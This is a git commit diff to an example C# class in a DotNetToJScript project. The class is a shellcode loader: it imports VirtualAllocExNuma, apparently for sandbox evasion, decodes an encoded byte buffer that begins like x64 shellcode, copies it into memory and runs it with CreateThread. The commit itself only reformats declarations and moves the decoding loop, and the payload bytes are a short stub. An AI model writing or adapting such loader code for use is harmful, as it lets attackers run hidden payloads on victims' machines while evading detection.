4c5a2de8701ad8c22dc35d81d3949635febfb4ab
trike33 <137085374+trike33@users.noreply.github.com>
2023-07-22 13:00:46 +0200

    Update TestClass.cs

--- DotNetToJScript/Example/TestClass.cs
+++ DotNetToJScript/Example/TestClass.cs
@@ -24,16 +24,13 @@ public class TestClass
 {
     #region
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
-     uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
 
     [DllImport("kernel32.dll")]
     static extern IntPtr GetCurrentProcess();
 
     [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
-    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr
-   lpThreadId);
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
     [DllImport("kernel32.dll")]
     static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
@@ -55,19 +52,17 @@ public class TestClass
         byte[] buf = new byte[10] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8 };
 
         int size = buf.Length;
-        
-        
-        
-        //Decode the payload encoded with key 2
-        for (int i = 0; i < buf.Length; i++)
-        {
-            buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
-        }
 
         IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
         if (addr == null)
         {
             return;
+        }
+
+        //Decode the payload encoded with key 2
+        for (int i = 0; i < buf.Length; i++)
+        {
+            buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
         }
         Marshal.Copy(buf, 0, addr, size);
         IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
